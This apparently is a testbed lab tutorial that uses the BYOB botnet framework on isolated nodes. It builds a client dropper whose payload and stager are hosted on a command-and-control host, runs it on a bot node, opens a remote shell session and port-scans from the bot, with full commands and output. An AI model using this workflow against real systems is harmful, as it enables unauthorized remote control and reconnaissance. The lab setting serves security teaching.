## Scanning Attack
Botmaster (`botmaster` in our case) uses bot nodes (`b1` in our case) to scan the bot. 

### Connection with client

We will use the `botmaster` node to generate a client. The client will have a portscanner module built into it.

SSH to the botmaster node from your XDC
```shell
ssh botmaster
```

```shell
cd /opt/byob/byob.git/byob
python3 client.py --freeze botmaster.infra 1337 portscanner
```
The output should look like this:

```shell


88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[>] Modules
        Adding modules...  -(5 modules added to client)

[>] Imports
        Adding imports...-(32 imports from 4 modules)

[>] Payload
        Uploading payload...  -(hosting payload at: http://botmaster.infra:1338/clients/payloads/jIJ.py)

[>] Stager
        Uploading stager... -(hosting stager at: http://botmaster.infra:1338/clients/stagers/jIJ.py)

[>] Dropper
        Writing dropper...  (355 bytes written to /modules/clients/droppers/byob_jIJ.py)
        Compiling executable...
91 INFO: PyInstaller: 6.4.0, contrib hooks: 2024.1
91 INFO: Python: 3.9.2
.
.
.
19652 INFO: Appending PKG archive to custom ELF section in EXE
19714 INFO: Building EXE from EXE-00.toc completed successfully.
(22,541,192 bytes saved to file: /opt/byob/byob.git/dist/jIJ)
```

We now scp this module to our home directory on the client (for example, `b1`):
```shell
scp dist/jIJ b1.infra:
```

Lastly, startup the server
```shell
python3 -u server.py
```
The server should start and should start a prompt as follows:

```shell
88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[?]  Hint: show usage information with the 'help' command

[rishitsaiya @ /opt/byob/byob]>
```

Parallely, SSH to the b1 node from your XDC through different terminal
```shell
ssh b1
```
Execute the payload from here
```shell
./jIJ
```

At this point, the server should display a message like:
```shell
[+] Connection: 172.30.0.11
    Session: 0
    Started: Wed Nov  8 20:34:50 2023
```

Connect with the bot node using
```shell
shell 0
```
You can verify the socket connection by typing `ls` at prompt in server to check.

#### Installing Nmap tool and Nmap Python Library
Install the Nmap and Nmap Python Library on `b1` node.

```
sudo apt-get install nmap
pip install python-nmap
```

#### Begin the scanning
On botmaster node where the server is running, type the command:

```shell
[ 0 @ /home/rishitsaiya ]>portscanner 172.30.0.11

{"22": {"protocol": "ssh", "service": "", "state": "open"}}
namp scan: {'tcp': {'method': 'connect', 'services': '22-500'}}
csv data: host;hostname;hostname_type;protocol;port;name;state;product;extrainfo;reason;version;conf;cpe
172.30.0.11;;;tcp;22;ssh;open;OpenSSH;protocol 2.0;syn-ack;8.4p1 Debian 5+deb11u3;10;cpe:/o:linux:linux_kernel
```

The IP can be checked from the MergeTB dashboard.